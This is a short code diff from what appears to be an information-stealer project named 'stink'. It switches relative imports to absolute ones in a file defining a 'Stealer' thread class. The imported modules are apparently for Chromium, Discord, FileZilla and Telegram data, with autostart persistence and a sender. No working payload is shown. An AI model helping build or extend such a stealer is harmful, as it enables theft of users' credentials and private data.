@@ -3,8 +3,8 @@ from shutil import rmtree
 from threading import Thread
 from os import path, makedirs
 
-from .modules import Chromium, Discord, FileZilla, System, Telegram
-from .utils import Autostart, config, Sender
+from stink.modules import Chromium, Discord, FileZilla, System, Telegram
+from stink.utils import Autostart, config, Sender
 
 
 class Stealer(Thread):
